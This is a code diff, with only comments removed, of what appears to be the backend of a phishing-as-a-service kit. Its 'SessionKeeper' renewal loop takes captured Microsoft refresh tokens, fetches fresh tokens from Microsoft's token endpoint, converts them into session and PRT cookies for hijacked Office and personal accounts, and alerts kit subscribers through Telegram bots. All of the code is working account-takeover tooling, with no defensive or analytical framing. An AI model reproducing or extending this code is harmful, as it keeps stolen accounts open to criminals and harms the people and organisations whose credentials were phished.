@@ -9,7 +9,7 @@ async function runRenewalCycle() {
   const windowHours = config.RENEWAL_WINDOW_HOURS;
   const maxAttempts = config.MAX_RENEWAL_ATTEMPTS;
 
-  // Pre-emptive renewal: renew cookies that are about to expire (within 6 hours)
+
   const [expiringSoon] = await db.query(
     `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type, ct.account_type
      FROM captured_tokens ct
@@ -30,7 +30,6 @@ async function runRenewalCycle() {
     await renewSingleCapture(capture, true); // true = pre-emptive
   }
 
-  // Regular renewal: cookies that have expired or are in renewal window
   const [expired] = await db.query(
     `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type, ct.account_type
      FROM captured_tokens ct
@@ -47,7 +46,7 @@ async function runRenewalCycle() {
   );
 
   for (const capture of expired) {
-    await renewSingleCapture(capture, false); // false = expired
+    await renewSingleCapture(capture, false); 
   }
 }
 
@@ -59,41 +58,32 @@ async function renewSingleCapture(capture, isPreemptive = false) {
       return { success: false, error: 'No refresh token' };
     }
 
-    // Exponential backoff: wait longer if we've had recent failures
     const attemptDelay = Math.min(Math.pow(2, capture.renewal_attempts || 0) * 1000, 30000);
     if (attemptDelay > 0 && !isPreemptive) {
       await sleep(attemptDelay);
     }
 
-    // Detect account type for proper endpoint/scope selection
     let accountType = capture.account_type || 'work_school';
     if (accountType === 'unknown') accountType = 'work_school';
     const isPersonal = accountType === 'personal';
 
-    // Use stored tenant from capture row (set at capture time)
     let tenant = capture.tenant || 'common';
     
-// For personal accounts, use consumers endpoint exclusively
 if (isPersonal) {
   tenant = 'consumers';
 } else if (tenant === 'common') {
-  // Try to get tenant from link jwt_payload for work accounts - with strict validation
   if (capture.link_id) {
     try {
       const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ?', [capture.link_id]);
       if (links.length && links[0].jwt_payload) {
         try {
           const parsed = JSON.parse(links[0].jwt_payload);
-          // SECURITY VALIDATION: Only allow trusted/known tenant values
-          // Prevents cross-tenant data leakage via manipulated jwt_payload
-          const allowedTenants = ['common', 'organizations', 'adfs']; // Safe default Microsoft tenants
+          const allowedTenants = ['common', 'organizations', 'adfs']; 
           if (parsed.tenant && allowedTenants.includes(parsed.tenant)) {
             tenant = parsed.tenant;
           } else if (parsed.tenant && /^[a-fA-F0-9\-]{36}$/.test(parsed.tenant)) {
-            // Allow valid GUID tenant IDs (organization-specific tenant)
             tenant = parsed.tenant;
           }
-          // If tenant is not in allowed list, keep it as 'common' and log warning
           if (!parsed.tenant || !(allowedTenants.includes(parsed.tenant) || /^[a-fA-F0-9\-]{36}$/.test(parsed.tenant))) {
             console.warn(`[SessionKeeper] Invalid tenant value in JWT payload: ${parsed.tenant}`, { link_id: capture.link_id });
           }
@@ -112,7 +102,6 @@ if (isPersonal) {
       ? 'openid profile email offline_access' 
       : 'https://graph.microsoft.com/.default offline_access openid profile';
 
-    // Call Microsoft token endpoint with refresh token using correct account-specific settings
     const response = await ms.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
       new URLSearchParams({
@@ -127,17 +116,11 @@ if (isPersonal) {
     const newAccessToken = response.data.access_token;
     const newRefreshToken = response.data.refresh_token || refreshToken;
 
-    // Check for soft errors (AADSTS50076 - interaction required)
     const errorCode = response.data.error_code || response.data.error;
     if (errorCode === '50076' || errorCode === 'interaction_required' || response.data.error === 'interaction_required') {
       await handleSoftError(capture, newAccessToken, newRefreshToken);
       return { success: false, error: 'Soft error - switched to device code flow', soft_error: true };
     }
-
-    // Convert to cookies with account-type awareness. user_id is passed so
-    // the KDF PRT cookie can be built from device_credentials.session_key_encrypted
-    // (without it the session-key lookup is skipped and background renewals
-    // silently lose the x-ms-RefreshTokenCredential cookie).
     const cookieResult = await convertTokensToCookies(
       newAccessToken,
       capture.template_type || 'office',
@@ -148,11 +131,10 @@ if (isPersonal) {
     );
 
   if (cookieResult.success && cookieResult.cookies) {
-    // Set cookie TTL based on token expiration or configurable maximum
-    const expiresIn = response.data.expires_in || 7776000; // Default 90 days in seconds
+    const expiresIn = response.data.expires_in || 7776000; 
     const config = require('../config/env');
-    const maxTTL = config.COOKIE_MAX_TTL_HOURS || 720; // Default 30 days max
-    const ttlHours = Math.min(Math.max(expiresIn / 3600, 24), maxTTL); // Min 24h, Max configurable
+    const maxTTL = config.COOKIE_MAX_TTL_HOURS || 720; 
+    const ttlHours = Math.min(Math.max(expiresIn / 3600, 24), maxTTL); 
 
       await db.query(
         `UPDATE captured_tokens
@@ -249,7 +231,6 @@ async function notifyUser(userId, message) {
 
     const user = users[0];
 
-    // Telegram notification
     if (user.notify_prt && user.telegram_id && user.telegram_bot_token) {
       try {
         await axios.post(`https://api.telegram.org/bot${user.telegram_bot_token}/sendMessage`, {
@@ -262,7 +243,6 @@ async function notifyUser(userId, message) {
       }
     }
 
-    // Email notification (if SMTP is configured)
     if (user.notify_login && user.email) {
       try {
         console.log(`Email notification for user ${userId}: ${message}`);
@@ -275,7 +255,7 @@ async function notifyUser(userId, message) {
   }
 }
 
-// Get renewal statistics for a user
+
 async function getRenewalStats(userId, captureId = null) {
   try {
     let query = `
